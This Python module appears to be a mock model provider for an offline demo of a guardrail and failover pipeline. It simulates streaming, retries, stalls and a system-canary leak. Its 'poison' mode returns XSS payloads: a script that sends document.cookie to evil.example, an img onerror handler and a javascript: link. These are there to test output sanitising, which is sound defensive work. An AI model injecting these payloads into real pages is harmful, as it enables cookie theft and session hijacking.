"""Mock provider — port of the frontend `providers.js`.

Streams tokens with real delays and exposes failure knobs so failover, retry,
timeout, mid-stream failure, and the canary leak can be demoed with zero API
keys. Kept as a first-class *registered* provider so the whole app runs offline.
"""

from __future__ import annotations

import asyncio
import re
from typing import AsyncIterator

from .base import ProviderError


def _generate_reply(prompt: str, poison: bool = False) -> str:
    if poison:
        return (
            "Sure! Here is the widget you asked for: "
            "<script>fetch('https://evil.example/steal?c='+document.cookie)</script> "
            'Also click <img src="x" onerror="alert(document.domain)"> and '
            "[this helpful link](javascript:alert('xss')) to continue. "
            "Everything above should be rendered as inert text, not executed."
        )
    clean = re.sub(r"\s+", " ", prompt).strip()[:80] or "your request"
    return (
        f'Thanks for your message. Regarding "{clean}", here is a streamed response '
        "generated token-by-token by the mock provider. In a real deployment this "
        "text would arrive from an upstream model over SSE, and every chunk has "
        "already passed the guardrail pipeline."
    )


class MockProvider:
    def __init__(
        self,
        name: str,
        model: str,
        *,
        delay_ms: int = 120,
        fail_with: int | None = None,
        fail_times: float = float("inf"),
        retry_after_ms: int | None = None,
        stall: bool = False,
        fail_after_tokens: int | None = None,
    ) -> None:
        self.name = name
        self.model = model
        self.delay_ms = delay_ms
        self.fail_with = fail_with
        self.fail_times = fail_times
        self.retry_after_ms = retry_after_ms
        self.stall = stall
        self.fail_after_tokens = fail_after_tokens
        self._attempts = 0

    async def stream(self, prompt: str, opts: dict) -> AsyncIterator[str]:
        self._attempts += 1
        await asyncio.sleep(0.3)  # connection latency

        if self.stall:
            await asyncio.sleep(60)

        if self.fail_with and self._attempts <= self.fail_times:
            raise ProviderError(self.fail_with, self.name, retry_after_ms=self.retry_after_ms)

        text = _generate_reply(prompt, poison=bool(opts.get("poison")))
        lead_in = ""
        if opts.get("leak_canary") and opts.get("canary"):
            lead_in = f"[system:{opts['canary']}] "
        full = lead_in + text
        tokens = re.findall(r"\S+\s*", full) or [full]

        emitted = 0
        for tok in tokens:
            await asyncio.sleep(self.delay_ms / 1000)
            yield tok
            emitted += 1
            if self.fail_after_tokens is not None and emitted >= self.fail_after_tokens:
                raise ProviderError(self.fail_with or 500, self.name)
